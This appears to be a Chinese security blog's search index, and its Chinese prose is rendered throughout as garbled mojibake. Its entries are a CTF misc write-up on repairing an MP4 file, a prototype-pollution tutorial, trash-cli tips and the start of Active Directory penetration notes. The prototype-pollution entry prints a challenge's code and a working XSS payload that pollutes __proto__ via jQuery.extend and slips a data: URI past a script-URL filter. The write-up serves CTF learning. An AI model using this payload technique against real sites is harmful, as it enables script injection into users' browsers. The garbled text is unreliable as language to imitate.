<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æŸmisc</title>
      <link href="/2020/02/20/%E6%9F%90misc/"/>
      <url>/2020/02/20/%E6%9F%90misc/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸çŸ¥é“å“ªé‡Œçš„misc"><a href="#ä¸çŸ¥é“å“ªé‡Œçš„misc" class="headerlink" title="ä¸çŸ¥é“å“ªé‡Œçš„misc"></a>ä¸çŸ¥é“å“ªé‡Œçš„misc</h1><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…</p><p>é‡Œé¢æœ‰ä¸€ä¸ªåŠ å¯†çš„è§†é¢‘æ–‡ä»¶å’ŒæœªåŠ å¯†çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p><p>æƒ³ç€å›¾ç‰‡ä¼šä¸ä¼šæœ‰æç¤º,ç”¨hxdæ‰“å¼€å‘ç°æœ«å°¾æœç„¶æœ‰æç¤º</p><p>kobe code</p><p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p><p>å¾—åˆ°å¯†ç :<code>OAEBEYTKNRBANB</code>,æˆåŠŸæ‹¿åˆ°è§†é¢‘æ–‡ä»¶</p><p>ä½†æ˜¯æç¤ºæ–‡ä»¶æ— æ³•æ‰“å¼€,ç”¨binwalkå•¥çš„å¼„äº†ä¸€ä¼š,å‘ç°é‡Œé¢æ²¡æœ‰è—å•¥</p><p>äºæ˜¯æ¢äº†ä¸ªæ€è·¯,çŒœæµ‹è¿™é¢˜æ˜¯è¦è®©æˆ‘ä»¬ä¿®å¤mp4æ–‡ä»¶?å¤´å¤§</p><blockquote><p>ä¸€ä¸ªMP4æ–‡ä»¶é¦–å…ˆä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œftypâ€ç±»å‹çš„boxï¼Œä½œä¸ºMP4æ ¼å¼çš„æ ‡å¿—å¹¶åŒ…å«å…³äºæ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼›ä¹‹åä¼šæœ‰ä¸”åªæœ‰ä¸€ä¸ªâ€œmoovâ€ç±»å‹çš„boxï¼ˆMovie Boxï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§container boxï¼Œå­boxåŒ…å«äº†åª’ä½“çš„metadataä¿¡æ¯ï¼›MP4æ–‡ä»¶çš„åª’ä½“æ•°æ®åŒ…å«åœ¨â€œmdatâ€ç±»å‹çš„boxï¼ˆMidia Data Boxï¼‰ä¸­ï¼Œè¯¥ç±»å‹çš„boxä¹Ÿæ˜¯container boxï¼Œå¯ä»¥æœ‰å¾ˆå¤šä¸ªï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ï¼ˆå½“åª’ä½“æ•°æ®å…¨éƒ¨å¼•ç”¨å…¶ä»–æ–‡ä»¶æ—¶ï¼‰ï¼Œåª’ä½“æ•°æ®çš„ç»“æ„ç”±metadataè¿›è¡Œæè¿°ã€‚</p></blockquote><p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p><p>å›¾ä¸­æ–¹æ¡†å³ä¸ºç¬¬ä¸€ä¸ªboxçš„head,åŸæœ¬åº”è¯¥æ˜¯<code>ftyp(0x66747970)</code>è€Œè¿™é‡Œç¡®å®<code>66459707</code>,ä½ç½®åäº†</p><p>æ¢å¤è„šæœ¬</p><pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:    keydata =f.read()t= keydata.encode(&quot;hex&quot;)l=len(t)t2=&quot;&quot;for i in range(0,l,2):    a=t[i]    b=t[i+1]    t2+=b    t2+=aprint t2[:100]t2=t2.decode(&quot;hex&quot;)f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)f2.write(t2)</code></pre><p>ç­‰è„šæœ¬è·‘å®ŒåæˆåŠŸæ¢å¤åŸæ¥çš„è§†é¢‘æ–‡ä»¶</p><p>è§†é¢‘éšå†™é€šå¸¸æŠŠå†…å®¹å­˜å‚¨åœ¨è§†é¢‘ä¸­çš„æŸä¸ªå›¾ç‰‡,æˆ‘ä»¬ç”¨ ffmpeg ,å°†è§†é¢‘åˆ†ç¦»æˆå›¾ç‰‡</p><p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p><p>ä¸€å¼ ä¸€å¼ çœ‹è¿‡å»,æˆ‘ä»¬å‘ç°,åœ¨ç¬¬3028å¼ çªç„¶å…¨é»‘äº†</p><p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p><p>è°ƒæ•´ä¸€ä¸‹å›¾ç‰‡çš„å¯¹æ¯”å¯¹,è·‘å‡ºä¸€ä¸ªäºŒç»´ç </p><p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p><p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/20/æŸmisc/">https://explorersss.github.io/2020/02/20/æŸmisc/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> åšé¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="jsåŸå‹é“¾æ±¡æŸ“"><a href="#jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="jsåŸå‹é“¾æ±¡æŸ“"></a>jsåŸå‹é“¾æ±¡æŸ“</h1><p> <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾</h2><p> æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆ object ï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong> ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡( <strong>proto</strong> ) ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚ </p><pre><code class="javascript">function Foo{    this.a=&quot;456&quot;;    this.c=&quot;777&quot;}Foo.prototype.b=&quot;123&quot;;Foo.prototype.c=&quot;789&quot;;var foo=new Foo();console.log(foo.a);//456    console.log(foo.b);//123console.log(foo.c);//777</code></pre><p>å½“åœ¨å½“å‰å¯¹è±¡æ‰¾ä¸åˆ°å±æ€§æˆ–æ–¹æ³•æ—¶ä¾¿ä¼šå‘ä¸Š(<code>__proto__</code>ä¸­)å¯»æ‰¾</p><ol><li>åœ¨å¯¹è±¡fooä¸­å¯»æ‰¾b</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>foo.__proto__</code>ä¸­å¯»æ‰¾b</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>foo.__proto__.__proto__</code>ä¸­å¯»æ‰¾b</li><li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li></ol><p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h2 id="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ—¶åŸå‹é“¾æ±¡æŸ“</h2><p>å½“æˆ‘ä»¬ä¿®æ”¹å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ—¶,å°±ç›¸å½“äºä¿®æ”¹å¯¹è±¡çš„çˆ¶ç±»</p><p>å½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–å±æ€§æ—¶ä¾¿ä¼šåœ¨çˆ¶ç±»ä¸­å¯»æ‰¾,å°±å˜ç›¸çš„æ§åˆ¶äº†è¿™ä¸ªç±»</p><pre><code class="javascript">let foo = {bar: 1}// foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar)// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰foo.__proto__.bar = 2// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1console.log(foo.bar)// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = {}// æŸ¥çœ‹zoo.barconsole.log(zoo.bar)</code></pre><h2 id="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"><a href="#å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“" class="headerlink" title="å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“"></a>å“ªäº›æƒ…å†µåŸå‹é“¾ä¼šè¢«æ±¡æŸ“</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p><p>æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶</p><p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p><p><strong>è­¦å‘Š:</strong> ä¸æ”¯æŒç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ false ã€‚</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>deep</em></td><td align="left">å¯é€‰ã€‚ Booleanç±»å‹ æŒ‡ç¤ºæ˜¯å¦æ·±åº¦åˆå¹¶å¯¹è±¡ï¼Œé»˜è®¤ä¸ºfalseã€‚å¦‚æœè¯¥å€¼ä¸ºtrueï¼Œä¸”å¤šä¸ªå¯¹è±¡çš„æŸä¸ªåŒåå±æ€§ä¹Ÿéƒ½æ˜¯å¯¹è±¡ï¼Œåˆ™è¯¥â€å±æ€§å¯¹è±¡â€çš„å±æ€§ä¹Ÿå°†è¿›è¡Œåˆå¹¶ã€‚</td></tr><tr><td align="left"><em>target</em></td><td align="left">Objectç±»å‹ ç›®æ ‡å¯¹è±¡ï¼Œå…¶ä»–å¯¹è±¡çš„æˆå‘˜å±æ€§å°†è¢«é™„åŠ åˆ°è¯¥å¯¹è±¡ä¸Šã€‚</td></tr><tr><td align="left"><em>object1</em></td><td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬ä¸€ä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td></tr><tr><td align="left"><em>objectN</em></td><td align="left">å¯é€‰ã€‚ Objectç±»å‹ ç¬¬Nä¸ªè¢«åˆå¹¶çš„å¯¹è±¡ã€‚</td></tr></tbody></table><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>é¢˜ç›®ä»£ç </p><p>car.class.js</p><pre><code class="javascript">class Car {    constructor(type, model, color, pic, key=&quot;&quot;) {        this.type = type        this.model = model        this.color = color        this.key = key        this.pic = pic        let started = false        this.start = () =&gt; {            started = true        }        this.isStarted = () =&gt; {            return started        }    }    powerOn() {        if (this.isStarted()) {            infobox(`Well Done!`)            nextCar()        } else {            $(&#39;.chargeup&#39;)[0].play()        }    }    info() {        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)    }    repair() {        if(urlParams.has(&#39;repair&#39;)) {            $.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))        }    }    light() {        infobox(`You turn on the lights ... Nothing happens.`)    }    battery() {        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)    }    ignition() {        if (this.key == &quot;&quot;) {            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)        }        if (this.key == &quot;ğŸ”‘&quot;) {            infobox(`The car started!`)            this.start()        }    }}</code></pre><p>util.js</p><pre><code class="javascript">const urlParams = new URLSearchParams(window.location.search)const h = location.hash.slice(1)const bugatti = new Car(&#39;Bugatti&#39;, &#39;T35&#39;, &#39;green&#39;, &#39;assets/images/bugatti.png&#39;)const porsche = new Car(&#39;Porsche&#39;, &#39;911&#39;, &#39;yellow&#39;, &#39;assets/images/porsche.png&#39;)const cars = [bugatti, porsche]porsche.repair = () =&gt; {    if(!bugatti.isStarted()){        infobox(`Not so fast. Repair the other car first!`)    }    else if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }    }    else{        infobox(`Repairing this is not that easy.`)    }}porsche.ignition = () =&gt; {    infobox(`Hmm ... WTF!`)}$(document).ready(() =&gt; {    const [car] = cars    $(&#39;.fa-power-off&#39;).click(() =&gt; car.powerOn())    $(&#39;.fa-car&#39;).click(() =&gt; car.info())    $(&#39;.fa-lightbulb-o&#39;).click(() =&gt; car.light())    $(&#39;.fa-battery-quarter&#39;).click(() =&gt; car.battery())    $(&#39;.fa-key&#39;).click(() =&gt; car.ignition())    $(&#39;.fa-wrench&#39;).click(() =&gt; car.repair())    $(&#39;.fa-step-forward&#39;).click(() =&gt; nextCar())    if(h.includes(&#39;Bugatti&#39;))        autoStart(bugatti)    if(h.includes(&#39;Porsche&#39;))        autoStart(porsche)})const nextCar = () =&gt; {    cars.push(cars.shift())    $(&quot;.image&quot;).attr(&#39;src&#39;, cars[0].pic);}const autoStart = (car) =&gt; {    car.repair()    car.ignition()    car.powerOn()}const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}const infobox = (text) =&gt; {    $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;none&#39;, &#39;border&#39;: &#39;none&#39;})    $(&#39;.infobox&#39;).addClass(&#39;infoAnimate&#39;)        .text(text)        .on(&#39;animationend&#39;, function() {            $(this).removeClass(&#39;infoAnimate&#39;)            $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;all&#39;, &#39;border&#39;: &#39;solid 1px rgba(255, 255, 255, .25)&#39;})    })}</code></pre><p>é˜…è¯»ä»£ç å‘ç°carç±»çš„repairæ–¹æ³•ä¼šè°ƒç”¨</p><p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))</code></p><p>å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><p>è€Œè¿™ä¸€é¢˜æˆ‘ä»¬çš„ç›®æ ‡æ—¶è¿›è¡Œxss</p><p>é˜…è¯»ä»£ç å‘ç°å¯¹è±¡<code>porsche</code>çš„repairWithHelperä¸­å¯ä»¥è¿›è¡Œxss</p><p>è€Œè°ƒç”¨repairWithHelperæ–¹æ³•å°±éœ€è¦è°ƒç”¨porscheçš„repairæ–¹æ³•</p><pre><code>if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){        if(urlParams.has(&#39;help&#39;)) {            repairWithHelper(urlParams.get(&#39;help&#39;))        }}</code></pre><p>æˆ‘ä»¬ç”¨æ§åˆ¶porsche.toString()==â€™lolâ€™(lolçš„md5æ˜¯9cdfb439c7876e703e307864c9167a15)ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ¥è®©ä¸Šå±‚ä¸º<code>[&#39;lol&#39;]</code>([â€˜lolâ€™].toString()==â€™lolâ€™)</p><p>é€šè¿‡autoStartæ¥è°ƒç”¨bugatti.repair(åŸå‹é“¾æ±¡æŸ“)å’Œporsche.repair(è°ƒç”¨repairWithHelperæ–¹æ³•)</p><p>æ‰€ä»¥æ„é€ payload:<code>http://127.0.0.1/?repair={&quot;started&quot;:true,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨repairWithHelperæ¥è¿›è¡Œxss</p><pre><code class="javascript">const repairWithHelper = (src) =&gt; {    /* who needs csp anyways !? */    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;    if (urlRegx.test(src)) {        let s = document.createElement(&#39;script&#39;)        s.src = src        $(&#39;head&#39;).append(s)    }}</code></pre><p>è™½ç„¶è¿™é‡Œå¯¹urlçš„åŸŸåè¿›è¡Œäº†é™åˆ¶ä¸èƒ½è¿œç¨‹æ–‡ä»¶åŒ…å«</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨dataåè®®æ¥ç»•è¿‡æ­£åˆ™ä»è€Œç›´æ¥æ‰§è¡Œå‘½ä»¤</p><p>dataåè®®æ ¼å¼</p><pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>æœ€åçš„payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;ğŸ”‘&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/18/jsåŸå‹é“¾æ±¡æŸ“/">https://explorersss.github.io/2020/02/18/jsåŸå‹é“¾æ±¡æŸ“/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</title>
      <link href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/"/>
      <url>/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/</url>
      
        <content type="html"><![CDATA[<h1 id="é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿"><a href="#é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿" class="headerlink" title="é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿"></a>é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</h1><p>ä»Šå¤©åˆæ˜¯æ‚²æƒ¨çš„ä¸€å¤©,æ²¡è®¤çœŸçœ‹,rm -rf *é”™åœ°æ–¹äº†</p><p>ä¸ºäº†å†æ¬¡é¿å…æ‚²æƒ¨å‘½è¿</p><ol><li><p>è¿˜æ˜¯ä¸è¦è€æ˜¯ç”¨rootç”¨æˆ·äº†,åˆ›ä¸ªæ—¥å¸¸çš„ä½æƒé™ç”¨æˆ·,æœ‰å¿…è¦æ—¶å†ç™»é™†root</p></li><li><p>åˆ«ç”¨rm å•¦,æ”¹ç”¨trashå§</p></li></ol><h2 id="å®‰è£…trash-cli"><a href="#å®‰è£…trash-cli" class="headerlink" title="å®‰è£…trash-cli"></a>å®‰è£…trash-cli</h2><p><code>apt-get install trash-cli</code></p><p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p><p><code>source ~/.zshrc</code> </p><h2 id="trash-cli-å‘½ä»¤"><a href="#trash-cli-å‘½ä»¤" class="headerlink" title="trash-cli å‘½ä»¤"></a>trash-cli å‘½ä»¤</h2><table><thead><tr><th>command</th><th>explain</th></tr></thead><tbody><tr><td>trash-put/trash</td><td>å°†æ–‡ä»¶æˆ–ç›®å½•æ”¾è¿›å›æ”¶ç«™</td></tr><tr><td>trash-empty</td><td>æ¸…ç©ºå›æ”¶ç«™</td></tr><tr><td>trash-list</td><td>åˆ—å‡ºå›æ”¶ç«™ä¸­çš„æ–‡ä»¶</td></tr><tr><td>restore-trash</td><td>è¿˜åŸå›æ”¶ç«™ä¸­çš„æ–‡ä»¶</td></tr><tr><td>trash-rm</td><td>åˆ é™¤å›æ”¶ç«™ä¸­çš„å•ä¸ªæ–‡ä»¶</td></tr></tbody></table><h2 id="åƒåœ¾ç«™æ‰€åœ¨ä½ç½®"><a href="#åƒåœ¾ç«™æ‰€åœ¨ä½ç½®" class="headerlink" title="åƒåœ¾ç«™æ‰€åœ¨ä½ç½®"></a>åƒåœ¾ç«™æ‰€åœ¨ä½ç½®</h2><p><code>~/.local/share/Trash/files</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="https://explorersss.github.io/2020/02/17/é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿/">https://explorersss.github.io/2020/02/17/é¿å…rm-rf-çš„æ‚²æƒ¨å‘½è¿/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€</title>
      <link href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
      <url>/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸŸæ¸—é€å­¦ä¹ ç¬”è®°"><a href="#åŸŸæ¸—é€å­¦ä¹ ç¬”è®°" class="headerlink" title="åŸŸæ¸—é€å­¦ä¹ ç¬”è®°"></a>åŸŸæ¸—é€å­¦ä¹ ç¬”è®°</h1><h2 id="åè¯-ç¼©å†™"><a href="#åè¯-ç¼©å†™" class="headerlink" title="åè¯/ç¼©å†™"></a>åè¯/ç¼©å†™</h2><p> æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰ï¼ŒADï¼šæ´»åŠ¨ç›®å½•æ˜¯WindowsServeråœ¨ç½‘ç»œç¯å¢ƒä¸­æä¾›çš„â€œèµ„æºç›®å½•â€ã€‚æ´»åŠ¨ç›®å½•æ˜¯å‚¨å­˜ç€åŸŸä¸­ç›¸å…³èµ„æºä¿¡æ¯çš„ç›®å½•ï¼Œä¾‹å¦‚è®¡ç®—æœºï¼Œç”¨æˆ·ç»„ï¼Œæ•°æ®åº“ï¼ŒæœåŠ¡å™¨ï¼Œæ‰“å°æœºï¼Œç”¨æˆ·å±æ€§ï¼ˆæƒé™ç­‰ï¼‰ï¼Œå°±åƒä¸€ä¸ªæ•°æ®åº“ã€‚<br>åŸŸæ§ï¼ˆDomain Controllerï¼‰ï¼ŒDCï¼šå®‰è£…äº†ADçš„æœåŠ¡å™¨å°±æ˜¯åŸŸæ§åˆ¶å™¨ï¼Œå³æœ‰ADçš„è®¡ç®—æœºå°±æ˜¯DCã€‚ </p><h2 id="ä»€ä¹ˆæ˜¯åŸŸ"><a href="#ä»€ä¹ˆæ˜¯åŸŸ" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸŸ"></a>ä»€ä¹ˆæ˜¯åŸŸ</h2><p> å°†ç½‘ç»œä¸­å¤šå°è®¡ç®—æœºé€»è¾‘ä¸Šç»„ç»‡åˆ°ä¸€èµ·ï¼Œè¿›è¡Œé›†ä¸­ç®¡ç†ï¼Œè¿™ç§åŒºåˆ«äºå·¥ä½œç»„çš„é€»è¾‘ç¯å¢ƒå«åšåŸŸï¼ŒåŸŸæ˜¯ç»„ç»‡ä¸å­˜å‚¨èµ„æºçš„æ ¸å¿ƒç®¡ç†å•å…ƒï¼Œåœ¨åŸŸä¸­ï¼Œè‡³å°‘æœ‰ä¸€å°åŸŸæ§åˆ¶å™¨ï¼ŒåŸŸæ§åˆ¶å™¨ä¸­ä¿å­˜ç€æ•´ä¸ªåŸŸçš„ç”¨æˆ·å¸å·å’Œå®‰å…¨æ•°æ®åº“ã€‚ </p><h2 id="åŸŸçš„ç‰¹ç‚¹"><a href="#åŸŸçš„ç‰¹ç‚¹" class="headerlink" title="åŸŸçš„ç‰¹ç‚¹"></a>åŸŸçš„ç‰¹ç‚¹</h2><p> åŸŸæˆå‘˜è®¡ç®—æœºåœ¨ç™»å½•çš„æ—¶å€™å¯ä»¥é€‰æ‹©ç™»å½•åˆ°åŸŸä¸­æˆ–æ­¤è®¡ç®—æœºï¼Œç™»é™†åˆ°åŸŸä¸­çš„æ—¶å€™ï¼Œèº«ä»½éªŒè¯æ˜¯é‡‡ç”¨Kerberosåè®®åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿›è¡Œçš„ï¼Œç™»é™†åˆ°æ­¤è®¡ç®—æœºåˆ™æ˜¯é€šè¿‡SAMæ¥è¿›è¡ŒNTLMéªŒè¯çš„</p><p> é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸç”¨æˆ·å¯ä»¥ç™»å½•åˆ°åŸŸä¸­æ‰€æœ‰çš„å·¥ä½œç«™ï¼Œä¸åŒ…æ‹¬åŸŸæ§åˆ¶å™¨ï¼Œç®¡ç†å‘˜ä¹Ÿå¯ä»¥æŒ‡å®šå…·ä½“çš„è®¡ç®—æœºï¼ŒåŸŸç”¨æˆ·ä¿¡æ¯ä¿å­˜åœ¨æ´»åŠ¨ç›®å½•ä¸­</p><h2 id="ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†"><a href="#ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†" class="headerlink" title="ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†"></a>ä¸€äº›å…¶ä»–å…³äºåŸŸçš„çŸ¥è¯†</h2><h3 id="DNSå®šä½åŸŸæ§åˆ¶å™¨"><a href="#DNSå®šä½åŸŸæ§åˆ¶å™¨" class="headerlink" 